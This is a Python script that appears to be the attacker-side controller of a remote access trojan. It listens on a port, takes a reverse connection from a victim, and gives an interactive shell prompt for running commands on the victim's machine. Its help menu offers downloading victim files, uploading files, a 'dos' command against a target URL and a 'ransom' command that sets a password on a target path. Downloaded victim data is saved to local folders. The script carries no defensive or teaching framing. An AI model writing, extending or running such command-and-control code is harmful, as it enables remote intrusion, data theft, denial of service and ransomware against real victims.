import socket,sys,pathlib,subprocess,argparse

def attacker(port):

    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("",port))
        sock.listen(1)
        fd,addr = sock.accept()
        recv_data = fd.recv(1024).decode()
        if len(recv_data) == 0:
            sys.exit
        sys.stdout.write(f"{addr[0]} / {recv_data}\n")
        while True:
            command_data = input(f"Reverse@{addr[0]} ~ # ")
            if len(command_data) == 0:
                pass
            elif command_data == "quit":
                sys.stdout.write(f"[*] {addr[0]} quit...\n")
                sys.exit()
            elif command_data == "help":
                help_data = "\ncommand_list /\nexit\nquit\ndownload <victim_file_path> \nupload <my_file_path>\ndos <target_url>\nransom <new_password> <target_path>\n"
                sys.stdout.write(help_data)

            else:
                try:
                    fd.sendall(bytes(command_data,"utf-8"))
                    stdout_command = fd.recv(1024*1000000)
                    try:
                        sys.stdout.write(stdout_command.decode())
                    except UnicodeDecodeError: 
                        print(stdout_command)
                    if command_data == "exit":
                        sys.stdout.write(f"[-] {addr[0]} Logout...\n")
                        sys.exit()

                    elif command_data.split()[0] == "upload":
                        data = open(command_data.split()[1],"rb").read()
                        fd.sendall(data)
                        sys.stdout.write(fd.recv(1024).decode())
                    elif command_data.split()[0] == "download":
                        pathlib.Path(f"{addr[0]}_Data").mkdir(exist_ok=True)
                        try:
                            with open(f"{addr[0]}_Data/{command_data.split()[1]}","w+")as down_file:
                                down_file.write(stdout_command.decode())
                            sys.stdout.write("Download_OK!!\n")
                        except UnicodeDecodeError: 
                            with open(f"{addr[0]}_Date/{command_data.split()[1]}","wb+")as down_file:
                                down_file.write(stdout_command)
                            sys.stdout.write("Download_OK!!\n")
                except IndexError:
                    pass

def main():
    try:
        arg = argparse.ArgumentParser()
        arg.add_argument("-port",type=int,help="[$] Port_Number / -port < port_number >")
        parse = arg.parse_args()
        attacker(parse.port)
    except TypeError:
        subprocess.check_call(["python3",sys.argv[0],"-h"])
    except KeyboardInterrupt:
        sys.stdout.write("[-] Stop_Shell...\n")
        sys.exit()
if __name__ == "__main__":
    main()
